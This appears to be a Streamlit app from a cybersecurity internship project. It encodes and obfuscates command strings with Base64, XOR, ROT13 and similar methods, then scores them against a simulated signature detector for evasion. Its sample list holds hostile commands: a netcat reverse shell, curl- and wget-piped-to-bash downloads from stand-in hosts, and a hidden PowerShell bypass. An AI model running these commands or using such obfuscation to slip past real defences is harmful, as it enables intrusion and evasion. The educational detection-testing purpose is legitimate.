"""
Custom Payload Encoder & Obfuscation Framework
Unified Mentor — Cybersecurity Project 2

Streamlit web interface for live demonstration.
Run: streamlit run app.py
"""

import streamlit as st
import json
import sys
import os

# ── import the framework (same directory)
sys.path.insert(0, os.path.dirname(__file__))
from payload_framework import (
    encode_base64, decode_base64,
    encode_xor, decode_xor,
    encode_rot13, decode_rot13,
    encode_multilayer,
    obfuscate_random_insert, obfuscate_split_concat,
    obfuscate_escape_sequences, obfuscate_reverse,
    obfuscate_case_swap,
    run_evasion_test,
    run_full_pipeline,
    SIGNATURE_DB,
)
import random
from datetime import datetime

# ─────────────────────────────────────────────
# PAGE CONFIG
# ─────────────────────────────────────────────

st.set_page_config(
    page_title="Payload Encoder & Obfuscation Framework",
    page_icon="🔐",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ─────────────────────────────────────────────
# STYLES
# ─────────────────────────────────────────────

st.markdown("""
<style>
    .main-title {
        font-size: 2rem; font-weight: 700; color: #1F4E79;
        border-bottom: 3px solid #2E75B6; padding-bottom: 0.4rem;
        margin-bottom: 0.2rem;
    }
    .subtitle { color: #595959; font-size: 0.95rem; margin-bottom: 1.5rem; }
    .verdict-bypassed {
        background: #E2EFDA; color: #276221; font-weight: 700;
        padding: 3px 10px; border-radius: 4px; font-size: 0.85rem;
    }
    .verdict-detected {
        background: #FCE4D6; color: #9C0006; font-weight: 700;
        padding: 3px 10px; border-radius: 4px; font-size: 0.85rem;
    }
    .info-box {
        background: #D6E4F0; border-left: 4px solid #2E75B6;
        padding: 0.75rem 1rem; border-radius: 4px; margin: 0.5rem 0;
    }
    .warn-box {
        background: #FFF2CC; border-left: 4px solid #F0A500;
        padding: 0.75rem 1rem; border-radius: 4px; margin: 0.5rem 0;
    }
    .code-output {
        background: #1E1E1E; color: #D4D4D4; font-family: monospace;
        font-size: 0.82rem; padding: 1rem; border-radius: 6px;
        white-space: pre-wrap; word-break: break-all;
    }
    .metric-card {
        background: #F8F9FA; border: 1px solid #DEE2E6;
        border-radius: 8px; padding: 1rem; text-align: center;
    }
    .sig-badge {
        display: inline-block; background: #FCE4D6; color: #9C0006;
        border-radius: 3px; padding: 2px 6px; margin: 2px;
        font-size: 0.78rem; font-family: monospace;
    }
</style>
""", unsafe_allow_html=True)

# ─────────────────────────────────────────────
# HEADER
# ─────────────────────────────────────────────

st.markdown('<div class="main-title">🔐 Custom Payload Encoder & Obfuscation Framework</div>', unsafe_allow_html=True)
st.markdown('<div class="subtitle">Unified Mentor — Cybersecurity Internship | Project 2 &nbsp;|&nbsp; June 2026</div>', unsafe_allow_html=True)

st.markdown("""
<div class="warn-box">
⚠️ <strong>Disclaimer:</strong> This tool is strictly for educational and ethical security research.
All detection is simulated. No real malware is produced or deployed.
</div>
""", unsafe_allow_html=True)

# ─────────────────────────────────────────────
# SIDEBAR
# ─────────────────────────────────────────────

with st.sidebar:
    st.markdown("### ⚙️ Configuration")

    mode = st.radio(
        "Mode",
        ["🔬 Full Pipeline", "🔢 Single Encode", "🔓 Single Decode"],
        index=0,
    )

    st.markdown("---")
    st.markdown("### 📝 Payload Input")

    sample_options = {
        "Custom input": "",
        "cmd.exe powershell bypass": "cmd.exe /c powershell -exec bypass -nop -w hidden",
        "Netcat reverse shell": "nc -e /bin/bash 10.0.0.1 4444",
        "wget shell download": "wget http://10.0.0.1/shell.sh | bash",
        "Python os.system": "python3 -c \"import os; os.system('/bin/bash')\"",
        "curl pipe bash": "curl http://malicious.site/payload | bash",
    }

    sample_choice = st.selectbox("Sample payloads", list(sample_options.keys()))
    default_payload = sample_options[sample_choice]

    payload_input = st.text_area(
        "Payload string",
        value=default_payload,
        height=100,
        placeholder="Enter payload to encode/obfuscate...",
    )

    st.markdown("---")
    st.markdown("### 🔑 XOR Key")
    xor_key_str = st.text_input("Key (hex or int)", value="0x41")
    try:
        xor_key = int(xor_key_str, 0)
    except ValueError:
        st.error("Invalid key — use 0x41 or 65")
        xor_key = 0x41

    st.markdown(f"Key value: **{xor_key}** (0x{xor_key:02X})")

    st.markdown("---")
    st.markdown("### 📦 Export")
    export_json = st.checkbox("Show JSON output", value=False)

    st.markdown("---")
    st.caption("🛡️ 22 simulated signatures in detector")
    st.caption(f"📅 June 2026")

# ─────────────────────────────────────────────
# MAIN — FULL PIPELINE MODE
# ─────────────────────────────────────────────

if not payload_input.strip():
    st.info("Enter a payload in the sidebar to begin.")
    st.stop()

payload = payload_input.strip()

# ── Original evasion check
orig_evasion = run_evasion_test(payload)

# ─────────────────────────────────────────────
# SINGLE ENCODE MODE
# ─────────────────────────────────────────────

if "Single Encode" in mode:
    st.markdown("## 🔢 Single Encode")

    col1, col2 = st.columns([1, 2])
    with col1:
        method = st.selectbox("Encoding method", ["Base64", "XOR", "ROT13"])

    if method == "Base64":
        result = encode_base64(payload)
    elif method == "XOR":
        result = encode_xor(payload, xor_key)
    else:
        result = encode_rot13(payload)

    evasion = run_evasion_test(result)

    st.markdown(f"**Input:** `{payload}`")
    st.markdown(f"**Method:** {method}")
    st.markdown(f"**Output:**")
    st.code(result, language=None)

    verdict_cls = "verdict-bypassed" if not evasion["detected"] else "verdict-detected"
    st.markdown(
        f'**Evasion Verdict:** <span class="{verdict_cls}">{evasion["verdict"]}</span>',
        unsafe_allow_html=True,
    )
    st.stop()

# ─────────────────────────────────────────────
# SINGLE DECODE MODE
# ─────────────────────────────────────────────

if "Single Decode" in mode:
    st.markdown("## 🔓 Single Decode")

    col1, _ = st.columns([1, 2])
    with col1:
        method = st.selectbox("Decoding method", ["Base64", "XOR", "ROT13"])

    if method == "Base64":
        result = decode_base64(payload)
    elif method == "XOR":
        result = decode_xor(payload, xor_key)
    else:
        result = decode_rot13(payload)

    st.markdown(f"**Encoded input:** `{payload}`")
    st.markdown(f"**Decoded output:**")
    st.code(result, language=None)
    st.stop()

# ─────────────────────────────────────────────
# FULL PIPELINE
# ─────────────────────────────────────────────

st.markdown("## 📊 Pipeline Results")

# ── Original payload status
col_a, col_b, col_c = st.columns(3)
with col_a:
    st.markdown("**Original Payload**")
    st.code(payload, language=None)

with col_b:
    verdict_cls = "verdict-detected" if orig_evasion["detected"] else "verdict-bypassed"
    st.markdown("**Detection Status**")
    st.markdown(
        f'<span class="{verdict_cls}">{orig_evasion["verdict"]}</span>',
        unsafe_allow_html=True,
    )

with col_c:
    st.markdown("**Matched Signatures**")
    if orig_evasion["matched_signatures"]:
        sigs_html = " ".join(
            f'<span class="sig-badge">{s}</span>' for s in orig_evasion["matched_signatures"]
        )
        st.markdown(sigs_html, unsafe_allow_html=True)
    else:
        st.markdown("*None*")

st.markdown("---")

# ── Build results
random.seed(42)
results = []

results.append(("Base64 Encoded",                   encode_base64(payload)))
results.append((f"XOR Encoded (key=0x{xor_key:02X})", encode_xor(payload, xor_key)))
results.append(("ROT13 Encoded",                     encode_rot13(payload)))
results.append(("Base64 → XOR (multi-layer)",        encode_multilayer(payload, ["base64", "xor"], xor_key)))
results.append(("ROT13 → Base64 (multi-layer)",      encode_multilayer(payload, ["rot13", "base64"])))
results.append(("XOR → Base64 → ROT13 (3-layer)",    encode_multilayer(payload, ["xor", "base64", "rot13"], xor_key)))
results.append(("Obfuscation: Random Char Insert",   obfuscate_random_insert(payload)))
results.append(("Obfuscation: Split & Concat",       obfuscate_split_concat(payload)))
results.append(("Obfuscation: Hex Escape Sequences", obfuscate_escape_sequences(payload)))
results.append(("Obfuscation: String Reversal",      obfuscate_reverse(payload)))
results.append(("Obfuscation: Case Swap",            obfuscate_case_swap(payload)))
results.append(("Base64 + Escape (hybrid)",          obfuscate_escape_sequences(encode_base64(payload))))
results.append(("XOR + Split-Concat (hybrid)",       obfuscate_split_concat(encode_xor(payload, xor_key))))

evasions = [(label, enc, run_evasion_test(enc)) for label, enc in results]

# ── Summary metrics
bypassed = sum(1 for _, _, e in evasions if not e["detected"])
detected_count = len(evasions) - bypassed

m1, m2, m3, m4 = st.columns(4)
m1.metric("Techniques Tested", len(evasions))
m2.metric("Bypassed", f"{bypassed}/{len(evasions)}", f"{bypassed/len(evasions)*100:.1f}%")
m3.metric("Still Detected", detected_count)
m4.metric("Signatures Checked", len(SIGNATURE_DB))

st.markdown("---")
st.markdown("### 🔍 Technique Breakdown")

# ── Results table
for label, encoded, evasion in evasions:
    with st.expander(
        f"{'✅' if not evasion['detected'] else '❌'}  {label}",
        expanded=False,
    ):
        col1, col2 = st.columns([3, 1])
        with col1:
            display = encoded if len(encoded) <= 200 else encoded[:197] + "..."
            st.markdown(f"**Encoded output:**")
            st.code(display, language=None)
        with col2:
            verdict_cls = "verdict-bypassed" if not evasion["detected"] else "verdict-detected"
            st.markdown("**Verdict:**")
            st.markdown(
                f'<span class="{verdict_cls}">{evasion["verdict"]}</span>',
                unsafe_allow_html=True,
            )
            if evasion["matched_signatures"]:
                st.markdown("**Matched:**")
                for sig in evasion["matched_signatures"]:
                    st.markdown(f'<span class="sig-badge">{sig}</span>', unsafe_allow_html=True)

# ── JSON export
if export_json:
    st.markdown("---")
    st.markdown("### 📄 JSON Export")
    json_data = {
        "report_generated": datetime.now().strftime("%B %Y"),
        "xor_key": f"0x{xor_key:02X}",
        "original_payload": payload,
        "original_evasion": orig_evasion,
        "results": [
            {"technique": label, "encoded": enc, "evasion": ev}
            for label, enc, ev in evasions
        ],
        "summary": {
            "techniques_tested": len(evasions),
            "bypassed": bypassed,
            "detected": detected_count,
            "bypass_rate_pct": round(bypassed / len(evasions) * 100, 1),
        },
    }
    st.json(json_data)
    st.download_button(
        "⬇️ Download JSON",
        data=json.dumps(json_data, indent=2),
        file_name="evasion_report.json",
        mime="application/json",
    )

# ── Text report download
st.markdown("---")
report_text = run_full_pipeline(payload, xor_key)
st.download_button(
    "⬇️ Download Full Text Report",
    data=report_text,
    file_name="evasion_report.txt",
    mime="text/plain",
)

# ─────────────────────────────────────────────
# FOOTER
# ─────────────────────────────────────────────

st.markdown("---")
st.markdown(
    "<div style='text-align:center; color:#888; font-size:0.8rem;'>"
    "Custom Payload Encoder & Obfuscation Framework &nbsp;|&nbsp; "
    "Unified Mentor Cybersecurity Internship &nbsp;|&nbsp; "
    "Educational Use Only"
    "</div>",
    unsafe_allow_html=True,
)
